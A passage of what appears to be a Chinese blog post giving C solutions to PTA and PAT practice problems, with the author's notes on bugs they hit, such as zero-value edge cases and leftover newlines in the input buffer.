class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> N = <span class="number">0</span>, temp = <span class="number">0</span>, g = <span class="number">0</span>, temp_N = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">0</span>, b = <span class="number">0</span>, <span class="built_in">min</span> = <span class="number">0</span>, sum_a = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">temp_N = N;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(; N; N--)     <span class="comment">//开始输入的是N个数, 但是这里循环后变成了0, 所以后面就不能直接用N了, </span></span><br><span class="line">&#123;<span class="comment">//但是写程序时总是忽略了这点, 后面直接用N, 导致了出错还找半天.</span></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d/%d"</span>, &amp;a, &amp;b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">min</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp = <span class="built_in">min</span>; </span><br><span class="line"><span class="built_in">min</span> = (<span class="built_in">min</span>*b)/gcd(<span class="built_in">min</span>, b);</span><br><span class="line">sum_a *= (<span class="built_in">min</span>/temp), sum_a += (<span class="built_in">min</span>/b)*a; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">min</span> = b, sum_a += a;</span><br><span class="line"></span><br><span class="line">g = gcd(sum_a, <span class="built_in">min</span>);</span><br><span class="line">sum_a /= g, <span class="built_in">min</span> /= g;</span><br><span class="line">&#125; </span><br><span class="line">N = temp_N;</span><br><span class="line"></span><br><span class="line"><span class="built_in">min</span> *= N;</span><br><span class="line">g = gcd(sum_a, <span class="built_in">min</span>);</span><br><span class="line">sum_a /= g, <span class="built_in">min</span> /= g;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">min</span> &gt; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d/%d"</span>, sum_a, <span class="built_in">min</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, sum_a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="删除子字符串的一道好题-方法可以掌握"><a href="#删除子字符串的一道好题-方法可以掌握" class="headerlink" title="删除子字符串的一道好题  (方法可以掌握)"></a>删除子字符串的一道好题  (方法可以掌握)</h3><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200414093531965.png" alt="image-20200414093531965"></p><p>下面题解:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *p = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">81</span>] = &#123;<span class="number">0</span>&#125;, t[<span class="number">80</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">gets(s), gets(t);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(p = <span class="built_in">strstr</span>(s, t)) <span class="comment">//首先找到子字符串的位置.</span></span><br><span class="line">&#123;</span><br><span class="line">*p = <span class="string">'\0'</span>;  <span class="comment">//将其字符串分开.</span></span><br><span class="line"><span class="built_in">strcat</span>(s, p+<span class="built_in">strlen</span>(t));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(s);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="一道题因为没有注意-阶乘并不是-a-a-2-花了很多时间找错"><a href="#一道题因为没有注意-阶乘并不是-a-a-2-花了很多时间找错" class="headerlink" title="一道题因为没有注意, 阶乘并不是  a *= a+2, 花了很多时间找错"></a>一道题因为没有注意, 阶乘并不是  a *= a+2, 花了很多时间找错</h3><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200415160332020.png" alt="image-20200415160332020"></p><p>下面代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">double</span> i = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">double</span> sum = <span class="number">2</span>, x = <span class="number">0</span>, a = <span class="number">1</span>, b = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%lf"</span>, &amp;x);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>( ; <span class="number">2</span>*a/b &gt;= x; a *= i, b *= (<span class="number">2</span>*(i++) + <span class="number">1</span>))  <span class="comment">// 这里一定要注意不是 a *= a+1, b *= b+2</span></span><br><span class="line">sum += <span class="number">2</span>*a/b;</span><br><span class="line"></span><br><span class="line">sum += <span class="number">2</span>*a/b</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%.6lf"</span>, sum);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="平面向量加法"><a href="#平面向量加法" class="headerlink" title="平面向量加法"></a>平面向量加法</h3><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200526092314780.png" alt="image-20200526092314780"></p><ul><li><p>可以看到题目就是简单的加法, 但是这里考了个知识点, 正是我不知道的. 所以改了好几次才通过.</p></li><li><p>因为在C语言整数都是不管四舍五入的, 直接舍弃小数部分. 到了浮点数我默认以为保留几位小数时,也是直接舍弃多余小数部分, 但其实是四舍五入.</p></li></ul><p>下面题解.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">double</span> a = <span class="number">0</span>, b = <span class="number">0</span>, c = <span class="number">0</span>, d = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">double</span> m = <span class="number">0</span>, n = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%lf %lf %lf %lf"</span>, &amp;a, &amp;b, &amp;c, &amp;d);</span><br><span class="line">m = a+c, n = b+d; </span><br><span class="line"><span class="keyword">if</span>(m &gt; <span class="number">-0.05</span> &amp;&amp; m &lt; <span class="number">0</span>)</span><br><span class="line">m = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(n &gt; <span class="number">-0.05</span> &amp;&amp; n &lt; <span class="number">0</span>)</span><br><span class="line">n = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"(%.1lf, %.1lf)"</span>, m, n);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="查找书籍"><a href="#查找书籍" class="headerlink" title="查找书籍"></a>查找书籍</h3><ul><li><p>学了这么久的C语言还在犯这种错误。。。因为没有处理缓冲区还去调试半天。。。</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200528113931032.png" alt="image-20200528113931032"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> name[<span class="number">31</span>];</span><br><span class="line"><span class="keyword">double</span> price;</span><br><span class="line">&#125; A;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, <span class="built_in">max</span> = <span class="number">0</span>, <span class="built_in">min</span> = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">getchar();<span class="comment">//下面有字符输入， 这里必须吃掉回车。</span></span><br><span class="line">A *p = (A *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(A)*n);</span><br><span class="line">    <span class="built_in">memset</span>(p, <span class="number">0</span>, <span class="keyword">sizeof</span>(A)*n);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(n--)</span><br><span class="line">&#123;</span><br><span class="line">gets(p[i].name);<span class="comment">//gets()后不产生回车。只是把最后输入的回车转化为 '\0' 。</span></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%lf"</span>, &amp;p[i].price);</span><br><span class="line">getchar();<span class="comment">//因为是循环，后面输入字符，要先吃掉回车。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(p[<span class="built_in">max</span>].price &lt; p[i].price)</span><br><span class="line"><span class="built_in">max</span> = i;</span><br><span class="line"><span class="keyword">if</span>(p[<span class="built_in">min</span>].price &gt; p[i].price)</span><br><span class="line"><span class="built_in">min</span> = i;</span><br><span class="line">i++;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%.2lf, %s\n"</span>, p[<span class="built_in">max</span>].price, p[<span class="built_in">max</span>].name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%.2lf, %s\n"</span>, p[<span class="built_in">min</span>].price, p[<span class="built_in">min</span>].name);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>gets()后不产生回车。只是把最后输入的回车转化为 ‘\0’ 。</p></blockquote><h2 id="PAT-520-钻石争霸赛"><a href="#PAT-520-钻石争霸赛" class="headerlink" title="PAT 520 钻石争霸赛"></a>PAT 520 钻石争霸赛</h2><blockquote><p>其中2道很简单的题，但做的时候都有一个测试点怎么也过不了。。。当时真想不明白，比赛结束后来看了很久还是没发现错误，很想知道到测试点是什么，但这是不可能的。。。后面一度认为题目对C语言的问题，hh。其实不是，今天找到了问题，2个题还犯了同一种错误，记录一下。</p></blockquote><p>1.首先是简单的求平均成绩，问题就出现在如果成一个人的成绩是0的话，总成绩为0，但人数增加了一个啊。而我们一直使用的分数来确定是否有人存在。。。找这个错误真不容易诶。</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200601095453045.png" alt="image-20200601095453045"></p><p>代码警示错误。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> N = <span class="number">0</span>, sum_0 = <span class="number">0</span>, sum_1 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, score = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> count_1 = <span class="number">0</span>, count_2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line"><span class="keyword">while</span>(N--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;n, &amp;score);</span><br><span class="line"><span class="keyword">if</span>(n)</span><br><span class="line">sum_1 += score, count_1++;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">sum_0 += score, count_2++; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%.1lf"</span>, (<span class="keyword">double</span>)(sum_1+sum_0)/(count_1+count_2));</span><br><span class="line"><span class="keyword">if</span>(count_1)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %.1lf"</span>, (<span class="keyword">double</span>)sum_1/count_1);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" X"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(count_2) <span class="comment">//这里！！！开始一直使用的总分数是否为0来衡量人数是否为0！但人会有0分的情况啊。</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %.1lf"</span>, (<span class="keyword">double</span>)sum_0/count_2);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" X"</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.下面这个题犯了差不多的错。可以看到，就是倒序输出数字，可以很多方法。我使用的将每位数字先分离出来存入一个数组，在倒序输出。 但这里有一个0的情况，如果数字为0，那分离数字的结果就是什么也没有即什么也不输出。。</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200601100305684.png" alt="image-20200601100305684"></p><p>这里其实直接转化为字符串输出就好了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">0</span>, b = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> ch[<span class="number">13</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;a, &amp;b);</span><br><span class="line"><span class="built_in">sprintf</span>(ch, <span class="string">"%d"</span>, a += b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(; ch[i]; <span class="built_in">printf</span>(<span class="string">"%c\n"</span>, ch[i++]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结：2个题遇到同种类型的错误，折磨了我很久，但对自己进行补漏了。注意0的情况很重要。</strong></p><p>3.这个题注意，题目只说了输入的第一个数字没超过1000位，第二个未知的，有点小坑。</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200603085822035.png" alt="image-20200603085822035"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">10001</span>] = &#123;<span class="number">0</span>&#125;, b[<span class="number">2001</span>] = &#123;<span class="number">0</span>&#125;; </span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>, lenth1 = <span class="number">0</span>, lenth2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">gets(a);</span><br><span class="line">    lenth1 = <span class="built_in">strlen</span>(a);</span><br><span class="line">    </span><br><span class="line">gets(b); </span><br><span class="line"><span class="keyword">while</span>(*b != <span class="string">'-'</span>)</span><br><span class="line">&#123;</span><br><span class="line">        lenth2 = <span class="built_in">strlen</span>(b);</span><br><span class="line">        <span class="keyword">if</span>(lenth1 != lenth2)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"No\n"</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; lenth1; i++)</span><br><span class="line">        sum += <span class="built_in">abs</span>(a[i]-b[i]);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(sum &lt;= <span class="number">1</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Yes\n"</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"No\n"</span>);</span><br><span class="line">&#125;    </span><br><span class="line">        </span><br><span class="line">sum = <span class="number">0</span>, gets(b); </span><br><span class="line">&#125; </span><br><span class="line">     </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4.处理好每次赢输之间的变换。</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200603090014331.png" alt="image-20200603090014331"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;, flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> N = <span class="number">0</span>, a[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;, i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;a[i]);</span><br><span class="line">getchar(); </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(!flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; a[j%N]; i++)</span><br><span class="line">&#123;</span><br><span class="line">gets(s);</span><br><span class="line"><span class="keyword">if</span>(*s == <span class="string">'E'</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(*s == <span class="string">'C'</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Bu\n"</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(*s == <span class="string">'J'</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ChuiZi\n"</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"JianDao\n"</span>);</span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">gets(s);</span><br><span class="line"><span class="keyword">if</span>(*s == <span class="string">'E'</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(*s == <span class="string">'C'</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"JianDao\n"</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(*s == <span class="string">'J'</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Bu\n"</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ChuiZi\n"</span>);</span><br><span class="line">flag = <span class="number">0</span>, j++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="PAT乙级"><a href="#PAT乙级" class="headerlink" title="PAT乙级"></a>PAT乙级</h2><h3 id="我要通过"><a href="#我要通过" class="headerlink" title="我要通过"></a>我要通过</h3><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200613104611755.png" alt="image-20200613104611755"></p><p><strong>题目的难点也就是条件三，如果没有理解到位，总是会有条件过不了。。。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">judge</span><span class="params">(<span class="keyword">char</span> *a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> flag = <span class="number">0</span>, other = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> p = <span class="number">0</span>, t = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> q = <span class="number">0</span>, z = <span class="number">0</span>, h = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(a[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i] == <span class="string">'A'</span>)</span><br><span class="line"><span class="keyword">if</span>(flag == <span class="number">0</span>)</span><br><span class="line">q++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(flag == <span class="number">1</span>)</span><br><span class="line">z++;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">h++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a[i] == <span 